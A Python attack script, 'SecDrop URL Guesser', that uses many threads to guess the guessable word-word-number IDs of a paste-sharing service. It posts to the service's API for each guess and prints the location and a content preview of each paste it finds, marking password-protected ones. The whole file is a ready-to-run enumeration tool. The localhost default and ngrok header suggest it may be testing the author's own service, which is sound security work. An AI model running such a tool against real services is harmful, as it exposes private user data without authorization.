#!/usr/bin/env python3
"""
SecDrop URL Guesser — brute-force word-word-number paste IDs
Usage: python3 guess.py [--url http://target:5000] [--delay 0.05] [--threads 10]
"""

import requests
import random
import sys
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

WORDS = [
    "ace","air","ape","arc","ash","axe","bad","bag","bar","bat","bay","bed","bee",
    "bit","box","bug","bus","cab","cap","car","cat","cop","cow","cub","cup","cut",
    "day","dew","dig","dim","dog","dot","dry","dub","dug","ear","eat","eel","egg",
    "elm","emu","end","era","eve","eye","fan","far","fat","fax","fig","fin","fir",
    "fit","fix","fly","fog","fox","fun","fur","gap","gas","gem","gig","gin","gnu",
    "gum","gun","gut","gym","ham","hat","hay","hen","hex","hid","hip","hit","hog",
    "hop","hot","hub","hue","hug","hut","ice","ink","inn","ion","ivy","jam","jar",
    "jaw","jay","jet","jig","job","jog","joy","jug","jut","keg","ken","key","kid",
    "kin","kit","lab","lad","lag","lap","law","leg","lid","lip","lit","log","lot",
    "low","lug","mac","mad","map","mat","maw","max","mix","mob","mod","mop","mow",
    "mud","mug","nab","nag","nap","net","new","nil","nip","nit","nod","nor","not",
    "now","nun","nut","oak","oar","oat","odd","ode","off","oft","oil","old","orb",
    "ore","our","out","owl","own","pad","pal","pan","paw","pea","peg","pen","pet",
    "pie","pig","pin","pit","pod","pop","pot","pro","pub","pug","pun","pup","put",
    "rag","ram","ran","rap","rat","raw","ray","red","ref","rib","rid","rig","rim",
    "rip","rob","rod","rot","row","rub","rug","rum","run","rut","sad","sap","saw",
    "say","sea","set","shy","sin","sip","sir","sit","six","ski","sky","sly","sob",
    "sod","son","sop","sot","sow","soy","spa","spy","sum","sun","tab","tag","tan",
    "tap","tar","tax","tea","ten","the","tie","tin","tip","toe","ton","too","top",
    "tow","toy","try","tub","tug","van","vat","vet","via","vow","war","wax","web",
    "wet","wig","win","wit","woe","wok","won","woo","yak","yam","yap","yaw","yea",
    "yes","yet","yew","zen","zip","zoo",
]

def random_id():
    a = random.choice(WORDS)
    b = random.choice(WORDS)
    while b == a:
        b = random.choice(WORDS)
    return f"{a}-{b}-{random.randint(10,99)}"

def check_id(base_url, paste_id, timeout=3):
    """Try to access a paste — returns (id, content_preview, type) or None"""
    try:
        r = requests.post(
            f"{base_url}/api/paste/{paste_id}",
            json={},
            timeout=timeout,
            headers={"ngrok-skip-browser-warning": "1"}
        )
        if r.status_code == 200:
            data = r.json()
            if "content" in data:
                preview = data["content"][:80]
                return (paste_id, preview, "text")
            elif "filename" in data:
                return (paste_id, data.get("filename", "?"), "file")
            elif "error" in data and data["error"] == "Wrong password":
                return (paste_id, "🔒 password protected", "locked")
        elif r.status_code == 429:
            return None  # rate limited, skip
    except:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="SecDrop URL Guesser")
    parser.add_argument("--url", default="http://127.0.0.1:5000", help="Target URL")
    parser.add_argument("--delay", type=float, default=0.02, help="Delay between requests")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--count", type=int, default=0, help="Stop after N attempts (0=unlimited)")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    found = []
    tried = 0
    lock = __import__('threading').Lock()

    print(f"""
╔══════════════════════════════════════════════╗
║  SEC/DROP URL GUESSER                        ║
╠══════════════════════════════════════════════╣
║  Target:  {base:<36} ║
║  Threads: {args.threads:<36} ║
║  Space:   ~7,000,000 possible IDs            ║
╚══════════════════════════════════════════════╝
""")
    print("Trying... (Ctrl+C to stop)\n")

    def worker():
        nonlocal tried
        while True:
            if args.count and tried >= args.count:
                break
            paste_id = random_id()
            with lock:
                tried += 1
                current = tried
            if current % 100 == 0:
                with lock:
                    print(f"\r  [{current}] tested | {len(found)} found...", end="", flush=True)
            result = check_id(base, paste_id)
            if result:
                pid, preview, ptype = result
                with lock:
                    found.append(result)
                tag = "🔒" if ptype == "locked" else "📄" if ptype == "file" else "📝"
                print(f"\n  {tag} FOUND: {base}/{pid}")
                if ptype == "text":
                    print(f"     Preview: {preview}...")
            time.sleep(args.delay)

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(worker) for _ in range(args.threads)]
            for f in as_completed(futures):
                pass
    except KeyboardInterrupt:
        pass

    print(f"\n\n=== DONE ===\nTested: {tried} | Found: {len(found)}")
    for pid, preview, ptype in found:
        print(f"  {base}/{pid} ({ptype})")

if __name__ == "__main__":
    main()
